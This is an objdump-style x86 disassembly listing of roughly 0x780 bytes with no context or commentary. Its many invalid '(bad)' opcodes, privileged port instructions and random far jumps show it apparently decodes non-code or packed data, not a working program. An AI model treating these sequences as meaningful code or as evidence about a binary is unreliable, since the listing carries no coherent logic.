  40dc43:	mov    ebp,DWORD PTR [eax]
  40dc45:	sub    eax,DWORD PTR ds:0x5aedb80d
  40dc4b:	daa    
  40dc4c:	add    BYTE PTR [esi+0x42262a9f],bl
  40dc52:	or     eax,0x8bb0dd59
  40dc57:	dec    esp
  40dc58:	mov    eax,0x16cb0082
  40dc5d:	push   es
  40dc5e:	test   BYTE PTR [esi-0x56c81a8e],dl
  40dc64:	fs ret 
  40dc66:	mov    esp,0xdc8db504
  40dc6b:	mov    ah,0xda
  40dc6d:	dec    ebp
  40dc6e:	cmp    DWORD PTR [eax+0x38],ecx
  40dc71:	sbb    edx,DWORD PTR [ebp+0x6a]
  40dc74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc75:	push   edx
  40dc76:	inc    esi
  40dc77:	shl    eax,cl
  40dc79:	arpl   WORD PTR [edx],si
  40dc7b:	ror    bh,0x25
  40dc7e:	cmp    ah,BYTE PTR [esi+0x1d1b806]
  40dc84:	cdq    
  40dc85:	idiv   DWORD PTR [ecx]
  40dc87:	and    ch,BYTE PTR [esi]
  40dc89:	(bad)  
  40dc8a:	out    dx,al
  40dc8b:	(bad)  
  40dc8c:	addr16 cmp eax,0x1c2a026e
  40dc92:	push   ax
  40dc94:	mov    dl,BYTE PTR [esp+eax*1]
  40dc97:	loop   0x40dc3d
  40dc99:	pop    edi
  40dc9a:	mov    bl,0x53
  40dc9c:	xor    BYTE PTR [ebx+0x5d567c14],ah
  40dca2:	(bad)  [edi-0x18]
  40dca5:	arpl   WORD PTR [esi+edi*8-0x60cff8d6],bp
  40dcac:	das    
  40dcad:	sbb    eax,0x2dc5488a
  40dcb2:	cmp    ebp,ebp
  40dcb4:	scas   al,BYTE PTR es:[edi]
  40dcb5:	push   ss
  40dcb6:	sub    bl,BYTE PTR [ecx-0x4d26a463]
  40dcbc:	push   cs
  40dcbd:	ins    BYTE PTR es:[edi],dx
  40dcbe:	test   BYTE PTR [ebx],0x57
  40dcc1:	push   cs
  40dcc2:	test   al,0xac
  40dcc4:	pop    ebx
  40dcc5:	inc    esp
  40dcc6:	pop    es
  40dcc7:	loop   0x40dc53
  40dcc9:	or     eax,0x1e02f2
  40dcce:	jno    0x40dc5a
  40dcd0:	adc    eax,0x90d48b96
  40dcd5:	pusha  
  40dcd6:	in     al,0x34
  40dcd8:	icebp  
  40dcd9:	clc    
  40dcda:	nop
  40dcdb:	sahf   
  40dcdc:	push   ds
  40dcdd:	mov    dh,0x7c
  40dcdf:	or     cl,al
  40dce1:	(bad)  
  40dce2:	xor    al,0xd8
  40dce4:	adc    bh,BYTE PTR [edi-0x13]
  40dce7:	sbb    al,0x6c
  40dce9:	pop    ebp
  40dcea:	fwait
  40dceb:	xor    al,dl
  40dced:	or     eax,0xe3b6daf
  40dcf2:	rcr    DWORD PTR [esi+ebp*2+0x7e],cl
  40dcf6:	retf   0x433f
  40dcf9:	mov    al,0xf
  40dcfb:	fldenv ds:0xc58cbdb2
  40dd01:	sar    DWORD PTR [edi-0x63],cl
  40dd04:	repz mov edi,DWORD PTR [eax+0x7d]
  40dd08:	int3   
  40dd09:	dec    edx
  40dd0a:	in     eax,dx
  40dd0b:	(bad)  
  40dd0c:	imul   esi,DWORD PTR [edi],0xdb01dfd5
  40dd12:	sub    esp,esi
  40dd14:	inc    ecx
  40dd15:	push   edi
  40dd16:	xchg   ah,al
  40dd18:	aaa    
  40dd19:	sbb    ah,BYTE PTR [edx]
  40dd1b:	into   
  40dd1c:	push   esi
  40dd1d:	push   esi
  40dd1e:	retf   
  40dd1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dd20:	cmp    eax,0x1cf1a4b
  40dd25:	jp     0x40dd2f
  40dd27:	out    0x63,eax
  40dd29:	cld    
  40dd2a:	outs   dx,DWORD PTR ds:[esi]
  40dd2b:	out    dx,eax
  40dd2c:	scas   eax,DWORD PTR es:[edi]
  40dd2d:	mov    BYTE PTR [ebx],dl
  40dd2f:	or     al,0x1d
  40dd31:	iret   
  40dd32:	add    BYTE PTR [edi+0x2f],al
  40dd35:	(bad)  
  40dd36:	std    
  40dd37:	mov    esi,0x57e9d404
  40dd3c:	loope  0x40dd28
  40dd3e:	sub    bl,0xa1
  40dd41:	mov    edi,0x8323034b
  40dd46:	cdq    
  40dd47:	ins    BYTE PTR es:[edi],dx
  40dd48:	mov    bh,BYTE PTR [edi-0x1f]
  40dd4b:	int    0x56
  40dd4d:	test   DWORD PTR [ecx+ecx*2],esp
  40dd50:	ret    
  40dd51:	ror    DWORD PTR [ebp+edi*2-0x6c318d3c],cl
  40dd58:	jg     0x40dd25
  40dd5a:	jmp    0x40dddb
  40dd5c:	je     0x40dda4
  40dd5e:	ror    DWORD PTR [esi+0xc],0x26
  40dd62:	scas   al,BYTE PTR es:[edi]
  40dd63:	xchg   esp,eax
  40dd64:	or     al,BYTE PTR [edi]
  40dd66:	jns    0x40dd0f
  40dd68:	cwde   
  40dd69:	popf   
  40dd6a:	and    al,0xd6
  40dd6c:	or     DWORD PTR [esi],esp
  40dd6e:	jno    0x40dd1d
  40dd70:	mov    eax,ds:0xdae5ee20
  40dd75:	xor    BYTE PTR [edx+0x28],dh
  40dd78:	dec    ebp
  40dd79:	inc    ecx
  40dd7a:	jle    0x40dd73
  40dd7c:	inc    ebp
  40dd7d:	jg     0x40dd9e
  40dd7f:	aam    0xec
  40dd81:	ja     0x40dd88
  40dd83:	jae    0x40dd14
  40dd85:	lahf   
  40dd86:	jg     0x40dd35
  40dd88:	lea    ebp,[edx]
  40dd8a:	push   0x3d
  40dd8c:	mov    ecx,0x5abdebcd
  40dd91:	gs sbb al,0xc5
  40dd94:	and    DWORD PTR [edx-0x42],0xffffffa3
  40dd98:	test   al,0xce
  40dd9a:	mov    eax,0xccef7b75
  40dd9f:	sbb    eax,0xffa036ee
  40dda4:	ins    DWORD PTR es:[edi],dx
  40dda5:	aad    0xd7
  40dda7:	jo     0x40dd77
  40dda9:	test   eax,edx
  40ddab:	ror    ch,cl
  40ddad:	jmp    0x6226:0xef72c9dd
  40ddb4:	jg     0x40ddbb
  40ddb6:	sub    al,0xb0
  40ddb8:	adc    BYTE PTR ds:0x5ee39e51,bh
  40ddbe:	or     DWORD PTR [edx-0x5e552fe2],ecx
  40ddc4:	mov    ecx,0x532c4e36
  40ddc9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ddca:	fwait
  40ddcb:	ror    BYTE PTR [eax+0x2f3ec2f5],1
  40ddd1:	mov    al,0x58
  40ddd3:	mov    edx,0x98e0c3fa
  40ddd8:	dec    esp
  40ddd9:	adc    eax,DWORD PTR [edx-0x38]
  40dddc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dddd:	fistp  QWORD PTR [ebx]
  40dddf:	mov    DWORD PTR [edi],0xb121382a
  40dde5:	sbb    edx,ebx
  40dde7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dde8:	imul   edx,esp,0x71
  40ddeb:	adc    esi,ebx
  40dded:	popa   
  40ddee:	loope  0x40dd8e
  40ddf0:	ficom  DWORD PTR [edx-0x79fc4677]
  40ddf6:	or     BYTE PTR [ebx+0x3152a35b],bl
  40ddfc:	ret    0x6184
  40ddff:	std    
  40de00:	mov    al,0xb4
  40de02:	outs   dx,DWORD PTR ds:[esi]
  40de03:	cmp    al,0x82
  40de05:	jmp    0xd36cef69
  40de0a:	call   0x652cfe0
  40de0f:	pop    edi
  40de10:	mov    esi,?
  40de12:	and    al,0xea
  40de14:	out    dx,al
  40de15:	pop    ss
  40de16:	mov    dh,0x3c
  40de18:	call   0x2f473aac
  40de1d:	popf   
  40de1e:	pusha  
  40de1f:	rcl    BYTE PTR [esi+0x4e],0xc7
  40de23:	inc    esp
  40de24:	xor    BYTE PTR [ebp+0x7eb618d0],al
  40de2a:	or     eax,0x8cc5e41f
  40de2f:	cli    
  40de30:	mov    ebp,ss
  40de32:	and    al,0x91
  40de34:	xchg   esp,eax
  40de35:	jnp    0x40de8b
  40de37:	cs dec eax
  40de39:	and    bh,bl
  40de3b:	lar    ecx,cx
  40de3e:	scas   al,BYTE PTR es:[edi]
  40de3f:	or     esp,ebx
  40de41:	(bad)  
  40de42:	mov    ch,0xb2
  40de44:	push   0xffffff94
  40de46:	imul   edi,DWORD PTR [edx],0x6c2a5995
  40de4c:	sbb    BYTE PTR [esi],bh
  40de4e:	ret    
  40de4f:	sti    
  40de50:	jmp    0x40de67
  40de52:	ja     0x40de14
  40de54:	mov    al,0x10
  40de56:	xchg   DWORD PTR [edi-0x78],esp
  40de59:	rcl    BYTE PTR [esi+edx*1-0x6c66a53f],cl
  40de60:	mov    ecx,0xef5f574
  40de65:	aaa    
  40de66:	call   0x3ae6dee5
  40de6b:	mov    bl,0xe1
  40de6d:	rcr    DWORD PTR [eax],cl
  40de6f:	hlt    
  40de70:	mov    esp,0xa9e61989
  40de75:	add    al,0xf1
  40de77:	sub    al,0xea
  40de79:	mov    edi,0xa59697b4
  40de7e:	ret    0x809b
  40de81:	adc    eax,0xc3b0f940
  40de86:	add    eax,ebx
  40de88:	ret    
  40de89:	jmp    DWORD PTR [edi+edi*4]
  40de8c:	or     al,0x78
  40de8e:	outs   dx,DWORD PTR ds:[esi]
  40de8f:	xchg   ecx,eax
  40de90:	and    al,0x43
  40de92:	aaa    
  40de93:	or     edi,DWORD PTR [ebp+0x6f64a407]
  40de99:	inc    edi
  40de9a:	add    al,BYTE PTR [edi]
  40de9c:	je     0x40de28
  40de9e:	push   esi
  40de9f:	pop    ecx
  40dea0:	pop    ecx
  40dea1:	xor    DWORD PTR ds:0xc3f8c894,0xffffffe9
  40dea8:	jnp    0x40decf
  40deaa:	lea    ecx,[ebp-0x79]
  40dead:	mov    esp,0xdf798802
  40deb2:	xchg   ebx,eax
  40deb3:	adc    al,0x50
  40deb5:	pop    ecx
  40deb6:	xchg   ebx,eax
  40deb7:	aad    0x64
  40deb9:	pop    es
  40deba:	pop    esp
  40debb:	mov    cl,0x72
  40debd:	aam    0x4a
  40debf:	test   DWORD PTR [ebx+0x79],esp
  40dec2:	ss cwde 
  40dec4:	call   FWORD PTR [edx]
  40dec6:	push   ebp
  40dec7:	lea    ebp,[esi+0x356ae626]
  40decd:	fwait
  40dece:	lahf   
  40decf:	nop
  40ded0:	mov    edi,cs
  40ded2:	xlat   BYTE PTR ds:[ebx]
  40ded3:	sub    eax,0x64b5b1b4
  40ded8:	xchg   esp,eax
  40ded9:	sbb    eax,0xd5f373dc
  40dede:	xor    ecx,eax
  40dee0:	mov    eax,ds:0x38756aaa
  40dee5:	push   cs
  40dee6:	out    dx,eax
  40dee7:	test   BYTE PTR [ebx-0x66],bh
  40deea:	into   
  40deeb:	enter  0x882d,0x52
  40deef:	ret    
  40def0:	fidiv  WORD PTR [eax+0x693bdfe4]
  40def6:	lea    eax,[edi+0x2021dec5]
  40defc:	cmc    
  40defd:	xchg   ebp,eax
  40defe:	cld    
  40deff:	lds    ecx,FWORD PTR [esi+edi*8]
  40df02:	int    0x63
  40df04:	test   DWORD PTR [ebx-0x1a],edi
  40df07:	or     ax,0x1db
  40df0b:	mov    esi,0x268df0ba
  40df10:	hlt    
  40df11:	(bad)  
  40df12:	loopne 0x40df17
  40df14:	sbb    eax,0x6c26e1b6
  40df19:	mov    bh,0x7c
  40df1b:	pop    ebp
  40df1c:	and    al,0x4a
  40df1e:	int    0xbc
  40df20:	sub    eax,0x290a19fb
  40df25:	xor    BYTE PTR [ebx],cl
  40df27:	adc    eax,0x1154b104
  40df2c:	add    bh,0x25
  40df2f:	adc    BYTE PTR [eax-0xd],0x28
  40df33:	dec    esi
  40df34:	test   DWORD PTR [eax-0x17],eax
  40df37:	xlat   BYTE PTR ds:[ebx]
  40df38:	push   ebx
  40df39:	call   0xe172a904
  40df3e:	or     edx,ebp
  40df40:	xor    BYTE PTR [eax-0x6eea50e9],al
  40df46:	mov    al,BYTE PTR [ebx+0xb363ebd]
  40df4c:	fisubr DWORD PTR [esi-0x2cd08171]
  40df52:	lods   eax,DWORD PTR ds:[esi]
  40df53:	leave  
  40df54:	push   esp
  40df55:	mov    edi,0xf0331dc8
  40df5a:	sbb    eax,esp
  40df5c:	shufps xmm0,XMMWORD PTR [ecx+0x5e71fbdf],0x4d
  40df64:	dec    edx
  40df65:	dec    ebx
  40df66:	add    al,0xb9
  40df68:	mov    DWORD PTR [esi],ebx
  40df6a:	not    BYTE PTR [ecx-0x1b442b7c]
  40df70:	sub    eax,0x4afcd53e
  40df75:	fisttp DWORD PTR ds:0x47fcc966
  40df7b:	test   al,0x48
  40df7d:	not    DWORD PTR [edx+ebx*8+0x59c4d0a9]
  40df84:	lods   eax,DWORD PTR ds:[esi]
  40df85:	std    
  40df86:	inc    edi
  40df87:	pop    eax
  40df88:	jbe    0x40df59
  40df8a:	sti    
  40df8b:	out    dx,al
  40df8c:	ror    BYTE PTR [eax-0x71],1
  40df8f:	mov    al,0xb0
  40df91:	xchg   ecx,eax
  40df92:	ins    BYTE PTR es:[edi],dx
  40df93:	pop    esi
  40df94:	xchg   al,ah
  40df96:	fwait
  40df97:	jle    0x40df98
  40df99:	lock or al,cl
  40df9c:	push   edx
  40df9d:	adc    al,BYTE PTR [ebp-0xb]
  40dfa0:	shl    ebp,0xb4
  40dfa3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dfa4:	ficom  WORD PTR [eax]
  40dfa6:	sar    DWORD PTR [edi],0x2f
  40dfa9:	scas   al,BYTE PTR es:[edi]
  40dfaa:	out    dx,al
  40dfab:	sbb    edi,esi
  40dfad:	sub    ebp,DWORD PTR [esi-0xe513be2]
  40dfb3:	retf   
  40dfb4:	mov    ?,WORD PTR [edi+0x63efb25d]
  40dfba:	inc    esp
  40dfbb:	mov    bh,0xaf
  40dfbd:	push   esp
  40dfbe:	ficomp DWORD PTR [eax]
  40dfc0:	aam    0xe8
  40dfc2:	sbb    eax,0x44e8b4fe
  40dfc7:	int    0x63
  40dfc9:	rcr    BYTE PTR [esp+edi*2+0x49],cl
  40dfcd:	or     dl,BYTE PTR [ebx]
  40dfcf:	cld    
  40dfd0:	adc    ecx,DWORD PTR [ebx-0x2e]
  40dfd3:	xor    eax,0xd50cac4a
  40dfd8:	das    
  40dfd9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dfda:	cwde   
  40dfdb:	xor    ah,dl
  40dfdd:	pusha  
  40dfde:	imul   esp,DWORD PTR ds:0xbac03097,0x7f
  40dfe5:	pop    ebx
  40dfe6:	fwait
  40dfe7:	popa   
  40dfe8:	shr    edi,0xa
  40dfeb:	adc    ebp,esp
  40dfed:	add    BYTE PTR [esi],0x7d
  40dff0:	jmp    0x8236f48f
  40dff5:	push   ss
  40dff6:	xchg   ch,bl
  40dff8:	push   0x64b817d
  40dffd:	loope  0x40df96
  40dfff:	lock stc 
  40e001:	imul   ebx,DWORD PTR [ebp+0x65489c58],0xa9b8e5e8
  40e00b:	inc    ebx
  40e00c:	sub    eax,0x6e12db5a
  40e011:	lds    edi,FWORD PTR [edi-0x2571294b]
  40e017:	int3   
  40e018:	mov    edi,0x788e3198
  40e01d:	cmp    al,0x38
  40e01f:	inc    eax
  40e020:	push   ss
  40e021:	sar    BYTE PTR [ecx-0x462e517a],1
  40e027:	ins    DWORD PTR es:[edi],dx
  40e028:	lahf   
  40e029:	xor    eax,0xd7229c47
  40e02e:	int    0xdf
  40e030:	pop    edx
  40e031:	cmp    bh,BYTE PTR [esi-0x1c608e6]
  40e037:	and    al,BYTE PTR [edi-0x9649a9b]
  40e03d:	jg     0x40e08a
  40e03f:	mov    ?,WORD PTR [esi]
  40e041:	in     eax,0xa8
  40e043:	dec    esp
  40e044:	push   edx
  40e045:	cmp    DWORD PTR [edx+0x4df34b87],esp
  40e04b:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  40e04d:	out    0x3a,eax
  40e04f:	xor    BYTE PTR [esi],bl
  40e051:	push   edi
  40e052:	test   al,0xee
  40e054:	mov    esp,0x5acdd9df
  40e059:	jo     0x40dfea
  40e05b:	(bad)  
  40e05c:	stos   DWORD PTR es:[edi],eax
  40e05d:	outs   dx,DWORD PTR ds:[esi]
  40e05e:	fxch   st(7)
  40e060:	dec    ebp
  40e061:	adc    BYTE PTR [ebp+0x61bb71],ah
  40e067:	aad    0xf3
  40e069:	add    edi,DWORD PTR [eax]
  40e06b:	lds    ecx,FWORD PTR [esi]
  40e06d:	mov    cl,0xae
  40e06f:	dec    eax
  40e070:	(bad)  
  40e071:	inc    edi
  40e072:	mov    al,ds:0xf14140e5
  40e077:	jg     0x40e002
  40e079:	mov    ebp,0x4b8bf2d4
  40e07e:	sbb    eax,0x4ff5b944
  40e083:	shl    BYTE PTR [edx-0x6d],cl
  40e086:	out    dx,eax
  40e087:	cdq    
  40e088:	cs mov dh,0xb4
  40e08b:	shl    BYTE PTR [edx+0x4e],cl
  40e08e:	repnz retf 0x45d8
  40e092:	fadd   st,st(5)
  40e094:	sbb    dl,al
  40e096:	(bad)  
  40e098:	sbb    eax,0xe82bafc8
  40e09d:	lds    edx,FWORD PTR [eax-0x5033b10e]
  40e0a3:	and    ebx,0xffffffb0
  40e0a6:	imul   ebp,DWORD PTR [ecx],0xffffffbd
  40e0a9:	ror    DWORD PTR [edx+edi*4+0x53],0xf4
  40e0ae:	(bad)  
  40e0af:	adc    DWORD PTR [esi-0x3c],ebx
  40e0b2:	lods   al,BYTE PTR ds:[esi]
  40e0b3:	lahf   
  40e0b4:	mov    al,ds:0x87e4a495
  40e0b9:	les    edx,FWORD PTR [ebx-0x47]
  40e0bc:	outs   dx,BYTE PTR ds:[esi]
  40e0bd:	adc    BYTE PTR [edx],bh
  40e0bf:	pop    edx
  40e0c0:	test   BYTE PTR [eax-0x4a],ah
  40e0c3:	into   
  40e0c4:	dec    esp
  40e0c5:	sbb    BYTE PTR [eax+edi*2],dh
  40e0c8:	jae    0x40e13b
  40e0ca:	sub    DWORD PTR [ecx-0x118e2e14],esi
  40e0d0:	push   esi
  40e0d1:	les    eax,FWORD PTR [esi]
  40e0d3:	es mov dh,0x1c
  40e0d6:	sbb    bh,BYTE PTR [esi]
  40e0d8:	cmp    ch,BYTE PTR [eax+0x16]
  40e0db:	add    al,0xdf
  40e0dd:	popf   
  40e0de:	dec    ebp
  40e0df:	sbb    al,0x8f
  40e0e1:	mov    bl,0xed
  40e0e3:	sub    DWORD PTR [ebx],ebp
  40e0e5:	lahf   
  40e0e6:	and    BYTE PTR [edx-0x77],cl
  40e0e9:	mov    ds:0xee7ed566,al
  40e0ee:	into   
  40e0ef:	push   0xeede1bbb
  40e0f4:	div    DWORD PTR [edx+ebp*1]
  40e0f7:	xchg   ebp,eax
  40e0f8:	int3   
  40e0f9:	imul   esi,DWORD PTR [ecx],0x2c53b809
  40e0ff:	mov    al,BYTE PTR [eax-0x46]
  40e102:	daa    
  40e103:	repnz in eax,dx
  40e105:	pop    ss
  40e106:	jmp    0x40e175
  40e108:	daa    
  40e109:	mov    al,0xc8
  40e10b:	ret    
  40e10c:	pop    ss
  40e10d:	push   edi
  40e10e:	sbb    al,0xe9
  40e110:	push   esp
  40e111:	(bad)  
  40e112:	das    
  40e113:	add    eax,0xbb788d2
  40e118:	ror    dl,0x9f
  40e11b:	gs das 
  40e11d:	arpl   WORD PTR ds:0xcdcd8efd,ax
  40e123:	outs   dx,DWORD PTR ds:[esi]
  40e124:	ret    
  40e125:	sbb    DWORD PTR [edi-0x5a],ebx
  40e128:	(bad)  
  40e129:	pop    eax
  40e12a:	lahf   
  40e12b:	mov    edx,0x529d2fce
  40e130:	xchg   esp,eax
  40e131:	jecxz  0x40e163
  40e133:	xor    bh,BYTE PTR ds:0xd7bbea83
  40e139:	xchg   esp,eax
  40e13a:	pop    ebp
  40e13b:	enter  0x4fc3,0x1
  40e13f:	mov    esi,0x32bfbf72
  40e144:	popa   
  40e145:	jae    0x40e1c6
  40e147:	xchg   ebp,eax
  40e148:	and    DWORD PTR [esp+ebp*4+0x2e73adf4],0xffffffc1
  40e150:	into   
  40e151:	push   esp
  40e152:	push   0xffffffab
  40e154:	push   cs
  40e155:	dec    eax
  40e156:	hlt    
  40e157:	jo     0x40e1b2
  40e159:	dec    esp
  40e15a:	scas   eax,DWORD PTR es:[edi]
  40e15b:	call   0xc6ae86f1
  40e160:	js     0x40e16a
  40e162:	ds adc al,0x82
  40e165:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e166:	dec    esi
  40e167:	push   es
  40e168:	mov    dl,0xd8
  40e16a:	fs push esp
  40e16c:	jg     0x40e180
  40e16e:	or     eax,0x4f58ff7
  40e173:	fwait
  40e174:	jae    0x40e122
  40e176:	and    al,BYTE PTR [ebp+0x2a]
  40e179:	push   eax
  40e17a:	dec    ax
  40e17c:	mov    edi,0x8d638fd9
  40e181:	jne    0x40e1a1
  40e183:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e184:	cmp    eax,0xd32806a5
  40e189:	jns    0x40e118
  40e18b:	in     al,dx
  40e18c:	sbb    cl,al
  40e18e:	pop    esp
  40e18f:	push   cs
  40e190:	lds    esi,FWORD PTR [ebx]
  40e192:	(bad)  [edi]
  40e194:	dec    esi
  40e195:	jb     0x40e1ad
  40e197:	(bad)  
  40e198:	test   BYTE PTR [esi],0x48
  40e19b:	or     al,0x22
  40e19d:	mov    ds:0x997603d,al
  40e1a2:	push   edi
  40e1a3:	lock aam 0xf5
  40e1a6:	jmp    0x725c:0x3d92af5d
  40e1ad:	pop    eax
  40e1ae:	jae    0x40e167
  40e1b0:	xlat   BYTE PTR ds:[ebx]
  40e1b1:	pop    edi
  40e1b2:	pop    edx
  40e1b3:	aad    0xab
  40e1b5:	into   
  40e1b6:	enter  0xb677,0x90
  40e1ba:	jl     0x40e142
  40e1bc:	cwde   
  40e1bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e1be:	jmp    0x40e1bf
  40e1c0:	xor    eax,0xd25af3d3
  40e1c5:	sbb    edi,ebp
  40e1c7:	push   cs
  40e1c8:	test   BYTE PTR [ebx+0x47],dl
  40e1cb:	shr    DWORD PTR [edi-0x43210383],cl
  40e1d1:	jns    0x40e156
  40e1d3:	inc    esi
  40e1d4:	daa    
  40e1d5:	call   0xe636:0xc5807e17
  40e1dc:	mov    edi,0x51c6955
  40e1e1:	push   esp
  40e1e2:	xchg   ebp,eax
  40e1e3:	enter  0x31be,0xe6
  40e1e7:	fwait
  40e1e8:	xchg   ebx,eax
  40e1e9:	jecxz  0x40e1c7
  40e1eb:	pop    ss
  40e1ec:	mov    esp,0x7ea7e06
  40e1f1:	loop   0x40e22d
  40e1f3:	clc    
  40e1f4:	xchg   edi,eax
  40e1f5:	int3   
  40e1f6:	inc    BYTE PTR [esi-0x79]
  40e1f9:	icebp  
  40e1fa:	sbb    eax,0xeccc7ce4
  40e1ff:	idiv   DWORD PTR [ecx-0x70]
  40e202:	popf   
  40e203:	loopne 0x40e260
  40e205:	mov    WORD PTR cs:[ebx],gs
  40e208:	out    dx,eax
  40e209:	pop    ecx
  40e20a:	sar    DWORD PTR [eax],1
  40e20c:	mov    ch,0xe1
  40e20e:	sub    DWORD PTR [ebp+0x23],edx
  40e211:	lea    esi,[esi-0x34]
  40e214:	(bad)  [eax-0x63]
  40e217:	adc    bl,BYTE PTR [esi+ebx*8-0x1f9d7b74]
  40e21e:	daa    
  40e21f:	retf   0x5bb
  40e222:	push   eax
  40e223:	mov    ah,0xac
  40e225:	pop    ds
  40e226:	xor    DWORD PTR [edx-0x18],0x6f1b03fe
  40e22d:	mov    al,ds:0xd8fad9e0
  40e232:	mov    dh,0x41
  40e234:	sbb    BYTE PTR [ebp+0x2204e901],ah
  40e23a:	ret    0xabd2
  40e23d:	xor    ebp,DWORD PTR [ebp-0x4e]
  40e240:	(bad)  
  40e241:	jmp    0x1c2e:0x846ce9f7
  40e248:	cld    
  40e249:	or     DWORD PTR [edx+0x1c],edx
  40e24c:	imul   esi,DWORD PTR [ebp-0x52],0xea98950c
  40e253:	fld    st(0)
  40e255:	fisubr DWORD PTR [eax]
  40e257:	retf   0xb73a
  40e25a:	mov    ch,0x4b
  40e25c:	cmp    eax,DWORD PTR [eax-0x27]
  40e25f:	xor    DWORD PTR [edi],eax
  40e261:	mov    ch,0x8e
  40e263:	pop    edx
  40e264:	mov    eax,0x5d1891b9
  40e269:	mov    al,ds:0xe26d7c97
  40e26e:	outs   dx,BYTE PTR ds:[esi]
  40e26f:	or     eax,0xb82ddb6
  40e274:	mov    cs,WORD PTR [esi+0xc]
  40e277:	mov    eax,ds:0xbee12ab5
  40e27c:	mov    ah,0x9d
  40e27e:	or     eax,0xe34ce682
  40e283:	ror    BYTE PTR ds:0xbbd9aaf1,0x9d
  40e28a:	loope  0x40e254
  40e28c:	js     0x40e238
  40e28e:	cmp    DWORD PTR [ecx-0x1c],ebp
  40e291:	int    0x7f
  40e293:	cmp    bl,BYTE PTR [ebx-0x4a21e684]
  40e299:	enter  0x456c,0xfc
  40e29d:	sub    bh,BYTE PTR [eax-0x6c025fe3]
  40e2a3:	mov    edx,DWORD PTR [ebp+0x566a5a2c]
  40e2a9:	mov    bh,0x8e
  40e2ac:	in     eax,dx
  40e2ad:	hlt    
  40e2ae:	mov    edx,0x36cf59e0
  40e2b3:	xor    ah,bl
  40e2b5:	sbb    al,0x96
  40e2b7:	dec    ebp
  40e2b8:	aas    
  40e2b9:	cmp    al,0x1
  40e2bb:	inc    eax
  40e2bc:	jo     0x40e268
  40e2be:	push   edx
  40e2bf:	sub    eax,0xe1c54fc8
  40e2c4:	data16 adc al,0x18
  40e2c7:	or     DWORD PTR [ebx],ebp
  40e2c9:	sub    DWORD PTR [esi],0x143b30af
  40e2cf:	push   ecx
  40e2d0:	xor    BYTE PTR [esi],0x3f
  40e2d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e2d4:	inc    edx
  40e2d5:	out    0x73,al
  40e2d7:	jecxz  0x40e2db
  40e2d9:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  40e2db:	sub    dh,ah
  40e2dd:	inc    ebp
  40e2de:	into   
  40e2df:	xor    bl,BYTE PTR [eax+0x48078f25]
  40e2e5:	xchg   edi,eax
  40e2e6:	or     bh,BYTE PTR [eax]
  40e2e8:	push   ebx
  40e2e9:	into   
  40e2ea:	test   al,0x7d
  40e2ec:	cmp    cl,bl
  40e2ee:	mov    DWORD PTR [ecx+edi*2-0x4f],esp
  40e2f2:	or     al,0xe0
  40e2f4:	adc    ecx,esp
  40e2f6:	mov    ds:0x193aae60,al
  40e2fb:	jne    0x40e338
  40e2fd:	xor    dh,bl
  40e2ff:	dec    ebp
  40e300:	jl     0x40e28a
  40e302:	dec    edx
  40e303:	nop
  40e304:	pop    ds
  40e305:	inc    ebx
  40e306:	inc    edi
  40e307:	mov    ecx,0x707737ea
  40e30c:	in     eax,dx
  40e30d:	retf   
  40e30e:	mov    ds:0xab491fbf,eax
  40e313:	retf   
  40e314:	test   ch,dh
  40e316:	sbb    ebx,ebx
  40e318:	mov    bh,0x9d
  40e31a:	scas   eax,DWORD PTR es:[edi]
  40e31b:	pop    es
  40e31c:	sub    ch,BYTE PTR [ebx+0x406db292]
  40e322:	mov    ebp,0x82ffddeb
  40e327:	aas    
  40e328:	lahf   
  40e329:	jne    0x40e37c
  40e32b:	xchg   BYTE PTR [edx+edi*2],bl
  40e32e:	jne    0x40e322
  40e330:	sub    al,0xe1
  40e332:	inc    esp
  40e333:	pop    ds
  40e334:	shl    DWORD PTR [edx],cl
  40e336:	and    esp,DWORD PTR [ebx+0x50]
  40e339:	pop    eax
  40e33a:	sbb    al,0xdc
  40e33c:	dec    si
  40e33e:	inc    edi
  40e33f:	or     dh,BYTE PTR [ecx+0x3dbf0b5a]
  40e345:	add    bh,BYTE PTR [edx+0x5fb667e9]
  40e34b:	shl    BYTE PTR [edi-0x2b],1
  40e34e:	xchg   esp,eax
  40e34f:	js     0x40e33b
  40e351:	cmp    DWORD PTR [esi-0x66],edi
  40e354:	mov    ecx,0xfdea5e89
  40e359:	into   
  40e35a:	adc    BYTE PTR [edx],bh
  40e35c:	repz add al,BYTE PTR [ecx+0x7f]
  40e360:	inc    ebp
  40e361:	mov    ah,0x74
  40e363:	jnp    0x40e351
  40e365:	cmp    eax,0x19ceeee6
  40e36a:	adc    ebx,ebx
  40e36c:	in     eax,dx
  40e36d:	ror    BYTE PTR [eax-0x4e3b33cc],cl
  40e373:	rep outs dx,DWORD PTR es:[esi]
  40e376:	adc    eax,0xcf45d246
  40e37b:	(bad)  
  40e37d:	cs repz test eax,0x91dbcc4b
  40e384:	pop    ebx
  40e385:	xchg   ebx,eax
  40e386:	inc    ebp
  40e387:	fstp   TBYTE PTR [edi+0x3f05e710]
  40e38d:	mov    eax,ds:0x4a6b5ab6
  40e392:	or     edi,esp
  40e394:	jno    0x40e378
  40e396:	int3   
  40e397:	adc    ebp,DWORD PTR [edx+ecx*4-0x30b231cc]
  40e39e:	pushf  
  40e39f:	cmp    eax,DWORD PTR [edx-0x71ec5104]
  40e3a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e3a6:	call   0x7baf:0x600ba0fe
  40e3ad:	les    edi,FWORD PTR [esi+0x4eff7aba]
  40e3b3:	sub    dh,BYTE PTR [esi]
  40e3b5:	inc    edx
  40e3b6:	push   edi
  40e3b7:	or     dl,BYTE PTR [ebx+ecx*4+0x65]
  40e3bb:	and    DWORD PTR [ebp+0x6e],ebp
  40e3be:	dec    ebp
  40e3bf:	scas   eax,DWORD PTR es:[edi]
